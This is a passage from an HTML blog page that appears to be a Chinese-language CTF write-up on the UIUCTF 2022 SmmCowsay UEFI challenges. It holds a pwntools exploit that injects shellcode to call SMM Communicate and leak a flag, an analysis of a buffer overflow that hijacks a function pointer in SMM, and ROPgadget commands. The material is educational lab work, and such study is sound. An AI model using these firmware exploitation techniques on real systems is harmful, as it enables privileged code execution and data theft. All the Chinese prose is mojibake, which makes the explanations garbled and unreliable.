class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">BootServices = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RCX: 0x&#x27;</span>)</span><br><span class="line">AllocatePool = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;BootServices&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;LocateProtocol&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;AllocatePool&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = <span class="number">0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">    lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">guid:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCommunicationProtocolGuid&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">protocol:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">mSmmCommunication = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">Communicate = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;mSmmCommunication&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;Communicate&quot;</span>)</span><br><span class="line"></span><br><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;buffer&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCowsayCommunicationGuid = <span class="number">0xf79265547535a8b54d102c839a75cf12</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, 0x20</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 8                                /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x44440000                       /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ•ˆæœï¼š  </p><img src="/2024/12/14/uefi/21.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯èƒ½æœ‰äººä¼šé—®ä¸ºä»€ä¹ˆè¿™ä¸ª flag çš„å¶æ•°ä½ä¸è§äº†ï¼Œè¿™æ˜¯å› ä¸º flag å­˜å‚¨æ˜¯ UTF-16ï¼Œæ‰€ä»¥å®ƒå–æ•°æ®æ˜¯ä¸€æ¬¡è·³ 2 byte å–çš„ã€‚åªéœ€è¦åœ°å€åŠ  1 å³å¯è·å¾—æ‰€æœ‰ flagã€‚</p><h3 id="UIUCTF-2022-SmmCowsay2"><a href="#UIUCTF-2022-SmmCowsay2" class="headerlink" title="UIUCTF 2022 SmmCowsay2"></a>UIUCTF 2022 SmmCowsay2</h3><h4 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>é¢˜ç›®æè¿°ï¼š  </p><blockquote><p>We asked that engineer to fix the issue, but I think he may have left a backdoor disguised as debugging code.  </p></blockquote><p>è¿™ä¸€é¢˜å’Œä¸Šä¸€é¢˜çš„æ–‡ä»¶ç»“æ„ä¸€æ¨¡ä¸€æ ·ï¼Œè¿æ°”èµ·æ¥çš„æ•ˆæœä¹Ÿä¸€æ ·ï¼Œå”¯ä¸€ä¸åŒçš„å°±æ˜¯ patch æ–‡ä»¶ä¸ä¸€æ ·ã€‚ç”±äºä¸Šä¸€é¢˜å·²ç»å¯¹æ–‡ä»¶è¿›è¡Œäº†è¯¦ç»†çš„åˆ†æï¼Œæ‰€ä»¥è¿™é‡Œé‡ç‚¹å…³æ³¨æ¼æ´çš„éƒ¨åˆ†ã€‚<br>é¦–å…ˆçœ‹ 0005-PiSmmCpuDxeSmm-Protect-flag-addresses.patch æ–‡ä»¶ï¼š  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+  // Flag must not be seen</span></span><br><span class="line"><span class="addition">+  SmmSetMemoryAttributes (</span></span><br><span class="line"><span class="addition">+    0x44440000,</span></span><br><span class="line"><span class="addition">+    EFI_PAGES_TO_SIZE(1),</span></span><br><span class="line"><span class="addition">+    EFI_MEMORY_RP</span></span><br><span class="line"><span class="addition">+    );</span></span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ç”¨ gpt çš„è¯æ¥è¯´ï¼Œå…¶ä½œç”¨æ˜¯ï¼š</p><ul><li>SmmSetMemoryAttributes æ˜¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨ï¼Œå®ƒçš„ä½œç”¨æ˜¯è®¾ç½®æŒ‡å®šå†…å­˜èŒƒå›´çš„å±æ€§ã€‚</li><li>ç¬¬ä¸€ä¸ªå‚æ•° 0x44440000 æ˜¯è¦è®¾ç½®å±æ€§çš„å†…å­˜çš„èµ·å§‹åœ°å€ã€‚</li><li>ç¬¬äºŒä¸ªå‚æ•° EFI_PAGES_TO_SIZE(1) æ˜¯ä¸€ä¸ªå®ï¼Œç”¨äºå°†é¡µé¢æ•°è½¬æ¢ä¸ºå­—èŠ‚æ•°ã€‚åœ¨è¿™é‡Œï¼Œå®ƒè¡¨ç¤ºåªè®¾ç½®ä¸€ä¸ªé¡µé¢ï¼ˆé€šå¸¸æƒ…å†µä¸‹ï¼Œä¸€ä¸ªå†…å­˜é¡µé¢æ˜¯4KBå¤§å°ï¼Œé™¤éç‰¹åˆ«æŒ‡å®šäº†ä¸åŒçš„é¡µé¢å¤§å°ï¼‰ã€‚</li><li>ç¬¬ä¸‰ä¸ªå‚æ•° EFI_MEMORY_RP æ˜¯è¦è®¾ç½®çš„å†…å­˜å±æ€§ã€‚</li></ul><p>ç„¶åæˆ‘çœ‹äº†ä¸€ä¸‹æºç ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Attribute values */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_UC((u64)0x0000000000000001ULL)<span class="comment">/* uncached */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_WC((u64)0x0000000000000002ULL)<span class="comment">/* write-coalescing */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_WT((u64)0x0000000000000004ULL)<span class="comment">/* write-through */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_WB((u64)0x0000000000000008ULL)<span class="comment">/* write-back */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_UCE((u64)0x0000000000000010ULL)<span class="comment">/* uncached, exported */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_WP((u64)0x0000000000001000ULL)<span class="comment">/* write-protect */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_RP((u64)0x0000000000002000ULL)<span class="comment">/* read-protect */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_XP((u64)0x0000000000004000ULL)<span class="comment">/* execute-protect */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_NV((u64)0x0000000000008000ULL)<span class="comment">/* non-volatile */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_MORE_RELIABLE \</span></span><br><span class="line"><span class="meta">((u64)0x0000000000010000ULL)<span class="comment">/* higher reliability */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_RO((u64)0x0000000000020000ULL)<span class="comment">/* read-only */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_SP((u64)0x0000000000040000ULL)<span class="comment">/* specific-purpose memory (SPM) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_RUNTIME((u64)0x8000000000000000ULL)<span class="comment">/* range requires runtime mapping */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEM_DESC_VERSION1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_PAGE_SHIFT12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_PAGE_SIZE(1ULL &lt;&lt; EFI_PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_PAGE_MASK(EFI_PAGE_SIZE - 1)</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™æ®µä»£ç å®é™…ä¸Šå°±æ˜¯ç»™ 0x44440000 è¿™å—å†…å­˜è®¾ç½®äº†è¯»ä¿æŠ¤ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬ç›´æ¥å¯¹è¿™æ®µå†…å­˜è¿›è¡Œè¯»æ“ä½œç³»ç»Ÿå°±ä¼šæŠ¥é”™ã€‚  </p><p>Binexec çš„ä»£ç é¡µä¹Ÿæ²¡æœ‰ä»€ä¹ˆå˜åŒ–ï¼š  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+VOID</span></span><br><span class="line"><span class="addition">+Cowsay (</span></span><br><span class="line"><span class="addition">+  IN CONST CHAR16 *Message</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span></span><br><span class="line"><span class="addition">+  UINTN MessageLen = StrLen(Message) * sizeof(CHAR16);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer = AllocateRuntimeZeroPool(sizeof(*Buffer) + MessageLen);</span></span><br><span class="line"><span class="addition">+  if (!Buffer)</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;MessageLength = MessageLen;</span></span><br><span class="line"><span class="addition">+  CopyMem(Buffer-&gt;Data, Message, MessageLen);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  mSmmCommunication-&gt;Communicate(</span></span><br><span class="line"><span class="addition">+    mSmmCommunication,</span></span><br><span class="line"><span class="addition">+    Buffer,</span></span><br><span class="line"><span class="addition">+    NULL</span></span><br><span class="line"><span class="addition">+  );</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  FreePool(Buffer);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure><p>å˜åŒ–è¾ƒå¤§çš„æ˜¯ SmmCowsay çš„ patch æ–‡ä»¶ï¼š  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+EFI_STATUS</span></span><br><span class="line"><span class="addition">+EFIAPI</span></span><br><span class="line"><span class="addition">+SmmCowsayHandler (</span></span><br><span class="line"><span class="addition">+  IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="addition">+  IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  EFI_STATUS Status;</span></span><br><span class="line"><span class="addition">+  UINTN TempCommBufferSize;</span></span><br><span class="line"><span class="addition">+  UINT64 Canary;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Enter\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!CommBuffer || !CommBufferSize)</span></span><br><span class="line"><span class="addition">+    return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  TempCommBufferSize = *CommBufferSize;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!AsmRdRand64(&amp;Canary))</span></span><br><span class="line"><span class="addition">+    return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+  mDebugData.Canary = Canary;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Status = SmmCopyMemToSmram(mDebugData.Message, CommBuffer, TempCommBufferSize);</span></span><br><span class="line"><span class="addition">+  if (EFI_ERROR(Status))</span></span><br><span class="line"><span class="addition">+    goto out;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (mDebugData.Canary != Canary) &#123;</span></span><br><span class="line"><span class="addition">+    // We probably overrun into libraries. Don&#x27;t trust anything. Make triple fault here.</span></span><br><span class="line"><span class="addition">+    while (TRUE) &#123;</span></span><br><span class="line"><span class="addition">+      __asm__ __volatile__ (</span></span><br><span class="line"><span class="addition">+        &quot;push $0\n&quot;</span></span><br><span class="line"><span class="addition">+        &quot;push $0\n&quot;</span></span><br><span class="line"><span class="addition">+        &quot;lidt (%%rsp)\n&quot;</span></span><br><span class="line"><span class="addition">+        &quot;add $16,%%rsp\n&quot;</span></span><br><span class="line"><span class="addition">+        &quot;ud2\n&quot;</span></span><br><span class="line"><span class="addition">+        : : : &quot;memory&quot;</span></span><br><span class="line"><span class="addition">+      );</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (mDebugData.Icebp) &#123;</span></span><br><span class="line"><span class="addition">+    // If you define WANT_ICEBP in QEMU you actually get a breakpoint right here.</span></span><br><span class="line"><span class="addition">+    // Have fun playing with SMM.</span></span><br><span class="line"><span class="addition">+    __asm__ __volatile__ (</span></span><br><span class="line"><span class="addition">+      &quot;.byte 0xf1&quot; // icebp / int1</span></span><br><span class="line"><span class="addition">+      : : : &quot;memory&quot;</span></span><br><span class="line"><span class="addition">+    );</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  SetMem(mDebugData.Message, sizeof(mDebugData.Message), 0);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  mDebugData.CowsayFunc(CommBuffer, TempCommBufferSize);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+out:</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Exit\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä»–æ˜¯åˆ©ç”¨ SmmCopyMemToSmram å‡½æ•°å°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹ CommBuffer æ‹·è´è¿› mDebugData.Message ä¸­ï¼Œæ‹·è´çš„é•¿åº¦æ˜¯ TempCommBufferSizeã€‚ç„¶åç»è¿‡ä¸€ç³»åˆ—æ£€æµ‹å‘ç°æ²¡æœ‰é—®é¢˜åå°±è°ƒç”¨å‡½æ•°æŒ‡é’ˆ mDebugData.CowsayFuncã€‚<br>è¯´åˆ°è¿™é‡Œï¼Œæ¼æ´å°±éå¸¸çš„æ˜æ˜¾äº†ï¼Œå› ä¸º TempCommBufferSize çš„é•¿åº¦æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“çš„æ„é€ å‡ºæº¢å‡ºã€‚æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹ mDebugData çš„ç»“æ„ï¼š  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+struct &#123;</span></span><br><span class="line"><span class="addition">+  CHAR16 Message[200];</span></span><br><span class="line"><span class="addition">+  VOID EFIAPI (* volatile CowsayFunc)(IN CONST CHAR16 *Message, IN UINTN MessageLen);</span></span><br><span class="line"><span class="addition">+  BOOLEAN volatile Icebp;</span></span><br><span class="line"><span class="addition">+  UINT64 volatile Canary;</span></span><br><span class="line"><span class="addition">+&#125; mDebugData;</span></span><br><span class="line"><span class="addition">+</span></span><br></pre></td></tr></table></figure><p>è¯¥ç»“æ„ä½“è™½ç„¶è‡ªå·±å®ç°äº†ä¸€ä¸ª Canary ç”¨æ¥æ£€æµ‹æ˜¯å¦å‘ç”Ÿæº¢å‡ºï¼Œå¯æ˜¯ä»–å¹¶ä¸èƒ½ä¿æŠ¤åˆ°ä»–ä¸Šé¢çš„å‡½æ•°æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡æº¢å‡ºæ¥åŠ«æŒè¿™ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚  </p><p>åœ¨è¿›å…¥åˆ°ä¸‹ä¸€æ­¥ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦è§£å†³ä¸¤ä¸ªé—®é¢˜ï¼š1ã€å¦‚ä½•æ‰¾ gadget 2ã€å¦‚ä½•è¿›è¡Œè°ƒè¯•<br>å¯¹äºå®šä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ qemu çš„å¯åŠ¨è„šæœ¬ä¸­åŠ å…¥ä¸‹é¢è¿™è¡Œï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-global isa-debugcon.iobase=0x402 -debugcon file:./debug.log</span><br></pre></td></tr></table></figure><p>å¯åŠ¨ qemu åä»–å°±èƒ½å°†è°ƒè¯•ä¿¡æ¯ä¿å­˜åˆ°å½“å‰ç›®å½•ä¸‹çš„ debug.log æ–‡ä»¶ä¸­ï¼Œç„¶åæˆ‘ä»¬å°±èƒ½å¤Ÿåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­æ‰¾åˆ°å„ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„å…¥å£åœ°å€ï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">or4nge@localhost:/mnt/d/desktop/cow/run$ <span class="built_in">cat</span> debug.log | grep <span class="string">&#x27;SMM driver&#x27;</span></span><br><span class="line">Loading SMM driver at 0x00007FE3000 EntryPoint=0x00007FE526B CpuIo2Smm.efi</span><br><span class="line">Loading SMM driver at 0x00007FD9000 EntryPoint=0x00007FDC6E4 SmmLockBox.efi</span><br><span class="line">Loading SMM driver at 0x00007FBF000 EntryPoint=0x00007FCC246 PiSmmCpuDxeSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007F99000 EntryPoint=0x00007F9C851 FvbServicesSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007F83000 EntryPoint=0x00007F8BAD0 VariableSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007EE7000 EntryPoint=0x00007EE9D0F SmmCowsay.efi</span><br><span class="line">Loading SMM driver at 0x00007EDF000 EntryPoint=0x00007EE2684 CpuHotplugSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007EDD000 EntryPoint=0x00007EE2A1E SmmFaultTolerantWriteDxe.efi</span><br></pre></td></tr></table></figure><p>ç”±äºæ²¡æœ‰å¼€å¯ ASLRï¼Œæ‰€ä»¥æ¯æ¬¡è¿è¡Œè¿™ä¸ªåœ°å€æ˜¯ä¸ä¼šå˜çš„ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ç±»ä¼¼äºä¸‹é¢è¿™ä¸­æ–¹æ³•åœ¨å„ä¸ª efi æ–‡ä»¶ä¸­å¯»æ‰¾ gadget  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary CpuIo2Smm.efi  --offset 0x00007FE3000 </span><br><span class="line">ROPgadget --binary SmmLockBox.efi --offset 0x00007FD9000 </span><br><span class="line"><span class="comment"># ......</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯å¦‚ä½•è°ƒè¯•ï¼Œå…¶å®è°ƒè¯•æ–¹æ³•å’Œå¹³æ—¶è°ƒè¯•å†…æ ¸ä¸€æ ·ï¼Œè€Œä¸”å„ä¸ª efi çš„åŸºåœ°å€ä¹Ÿèƒ½é€šè¿‡ä¸Šé¢çš„æ–¹æ³•è·å¾—ï¼Œä¸è¿‡è¿™é‡Œæˆ‘é˜…è¯»äº† Marco Bonelli çš„ wp åå‘ç°å¯ä»¥èˆ’æœå¾ˆå¤šã€‚<br>è¿™é“é¢˜ç›®å·²ç»ç»™å‡ºäº†æ¯ä¸€ä¸ª efi çš„ç¬¦å·è¡¨ï¼Œæ‰€ä»¥ Marco Bonelli å†™äº†ä¸ª python è„šæœ¬åœ¨å¯åŠ¨ gdb æ—¶èƒ½å¤Ÿç›´æ¥å°†ç¬¦å·å¯¼å…¥ï¼Œå…¶è„šæœ¬ gdb_plugin.py å¦‚ä¸‹ï¼š  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 